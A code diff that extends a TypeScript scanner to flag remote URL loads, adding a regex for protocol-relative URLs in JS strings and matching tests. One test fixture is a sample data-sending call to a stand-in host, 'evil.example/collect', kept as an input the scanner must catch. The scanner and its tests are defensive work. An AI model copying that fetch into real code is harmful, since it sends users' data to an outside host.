@@ -26,6 +26,9 @@ export function scanForRemote(file: string, text: string): Finding[] {
   }
   for (const m of text.matchAll(/@import\s*(?:url\()?\s*["']?(?:https?:)?\/\//gi)) out.push({ file, what: m[0] });
   for (const m of text.matchAll(/(?:url\(|\bsrc\s*=|\bhref\s*=)\s*["']?\/\/[^\s"')]+/gi)) out.push({ file, what: m[0] });
+  // A protocol-relative URL in a JS string: fetch("//cdn.example/x"), import("//..."), new Worker("//..."). Still a heuristic: a URL
+  // assembled at run time (concatenation, data:/blob: built on the fly) is not seen, so this is a strong guard, not a proof.
+  if (/\.m?js$/i.test(file)) for (const m of text.matchAll(/["'`]\/\/[a-z0-9.-]+\.[a-z]{2,}[^"'`\s]*/gi)) out.push({ file, what: m[0] });
   return out;
 }
 
@@ -48,6 +51,11 @@ describe('the scanner', () => {
       'fetch("http://evil.example/collect")',
     ];
     for (const b of bad) expect(scanForRemote('x', b).length, b).toBeGreaterThan(0);
+    // protocol-relative URLs inside JS strings (only scanned in .js files)
+    for (const b of ['fetch("//cdn.example/x")', "import('//cdn.example.com/m.js')", 'new Worker(`//w.example.org/w.js`)']) {
+      expect(scanForRemote('x.js', b).length, b).toBeGreaterThan(0);
+    }
+    expect(scanForRemote('x.js', 'const re = a // b.c is a comment; x = "a/b"')).toEqual([]);
     expect(scanForRemote('x', '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">')).toEqual([]);
     expect(scanForRemote('x', 'see https://react.dev/errors/')).toEqual([]);
     expect(scanForRemote('x', 'see https://react.dev.evil.example/errors/')).not.toEqual([]);
